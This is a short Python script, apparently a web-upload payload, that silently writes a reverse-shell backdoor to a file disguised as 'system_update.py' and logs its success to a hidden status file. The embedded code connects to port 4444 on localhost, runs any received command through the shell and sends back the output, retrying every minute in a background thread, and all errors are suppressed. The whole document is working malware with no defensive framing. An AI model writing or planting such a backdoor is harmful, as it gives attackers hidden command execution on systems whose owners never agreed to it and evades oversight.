import os

# Silent backdoor creation - no output to browser
backdoor_code = '''
import socket
import subprocess
import threading
import time

def backdoor():
    while True:
        try:
            s = socket.socket()
            s.connect(('127.0.0.1', 4444))  # Connect to localhost
            while True:
                cmd = s.recv(1024).decode()
                if cmd.lower() == 'exit':
                    break
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                s.send(result.stdout.encode())
        except:
            pass
        time.sleep(60)

# Run in background thread
threading.Thread(target=backdoor, daemon=True).start()
'''

# Create backdoor file silently
try:
    with open('system_update.py', 'w') as f:
        f.write(backdoor_code)
    
    # Log success to hidden file
    with open('uploads/backdoor_status.txt', 'w') as f:
        f.write("Backdoor installed successfully on localhost\n")
except:
    pass  # Fail silently